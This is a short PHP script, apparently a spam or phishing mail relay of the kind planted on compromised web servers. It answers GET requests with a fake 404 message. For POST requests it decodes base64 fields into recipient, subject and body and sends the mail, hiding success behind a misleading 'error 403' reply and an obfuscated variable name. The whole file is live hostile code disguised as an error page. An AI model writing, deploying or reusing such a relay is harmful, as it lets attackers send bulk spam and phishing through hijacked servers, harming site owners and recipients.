<?php


$method = $_SERVER['REQUEST_METHOD'];

switch ($method) {
  case 'GET':
    //Here Handle GET Request
    echo '###ERROR 404';
exit;
    break;
  case 'POST':
    //Here Handle POST Request

foreach($_POST as $key => $x_value) {

$data = base64_decode($x_value) ;
$to_data = explode('|',  $data);

$to = $to_data[0];
$x_subject = $to_data[1];
$x_body = $to_data[2];
$from_user = $to_data[3];
$from_email = $to_data[4];
$header = $to_data[5];



$jfnbrsjfq =  mail($to, $x_subject, $x_body);
if($jfnbrsjfq){echo 'error 403';} else {echo 'error 404 : ' . $jfnbrsjfq;} 

}
}

